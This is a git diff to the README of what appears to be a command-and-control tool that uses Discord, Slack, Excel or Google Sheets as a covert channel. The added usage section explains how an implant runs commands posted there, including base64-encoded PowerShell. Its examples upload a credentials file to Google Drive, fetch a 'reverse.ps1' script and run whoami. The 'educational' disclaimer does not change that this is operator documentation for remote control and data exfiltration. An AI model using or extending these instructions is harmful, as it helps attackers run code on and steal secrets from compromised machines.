@@ -31,7 +31,29 @@ This is for educational purposes only. I am not responsible for any damage cause
 The app can be used to create a single SaaS app, fall through multiple apps until a connection is made, or try to create sessions to each one that's configured simultainously.  Each of these can be controleld by either:
 
 - Hardcoding the values inside the common/credentials.go file flag to the app
-- Filling in the values in the config.json file and having it in the same directory as the app when it's launched 
+- Filling in the values in the config.json file and having it in the same directory as the app when it's launched
+
+## How to use
+
+Each time the app is launched it will create a 8 character hex UUID to let the endpoint know if the commands are meant for it to execute or not.  If the SaaS app has other ways to differentiate the clients (e.g. they each have a seperate speadsheet page) then the UUID isn't needed.  When it disocers a command it will check to see if it's base64 incoded, if so it will run it as a Powershell encoded command.  If it's not base64 encoded it will run it as a normal command.  The following commands are supported:
+
+1. Discord, Slack example:  in the following example the client UUID is `60d45c81` and we want to tell the client to download the last attachment from the channel.  Following the UUID (space is opotional) you can enter the BOT UUID + COMMAND:  
+   - Download example: `60d45c81 download`
+   - Upload example of README.md: `60d45c81 download README.md`
+   - Execute whois example: `60d45c81 whois`
+   - Execute PowerShell encoded command example to get the public IP ((Invoke-WebRequest -URI https://icanhazip.com/).Content): `60d45c81 KABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAUgBJACAAaAB0AHQAcABzADoALwAvAGkAYwBhAG4AaABhAHoAaQBwAC4AYwBvAG0ALwApAC4AQwBvAG4AdABlAG4AdAA=`
+1. O365 Excel, Google Sheets exapmle: both of these apps create spreadsheets to track endpoints connections so the UUID isn't needed.  Instead the command to get executed goes in Column A and the return value is in Column B.  These each use the designated file storage location to upload and download files (e.g. Google Drive, OneDrive, etc.)
+
+> **Note:** Currently Google uses the drive file ID to download files and O365 uses the file name.
+> This will be updated in the future to use the file name for both.
+
+| Example | Column A | Column B |
+| -------- | -------- | -------- |
+|Upload example   |upload;/etc/http3/credentials | File Uploaded to: https://drive.google.com/drive/u/0/folders/1C5C23sa8OeDqNNRc-OdjL4WcjVB4pFAPe|
+|Google download (uses file ID) | download;1I80EO2PYK_-ahp7q_hsVQyjKmy23J67L;reverse.ps1|File Downloaded|
+|O365 download (uses file name) | download;script.txt|File Downloaded|
+| Cmd example         | whoami   | tim|
+| Powershell encoded command Example | (Invoke-WebRequest -URI https://icanhazip.com/).Content | 52.123.5.2 |
 
 ### Defaults
 
@@ -157,7 +179,7 @@ A sample command to build the app with the default name of "saas-squash" would b
 ./build.sh
 ```
 
-or 
+or
 
 ```none
 .\build.ps1
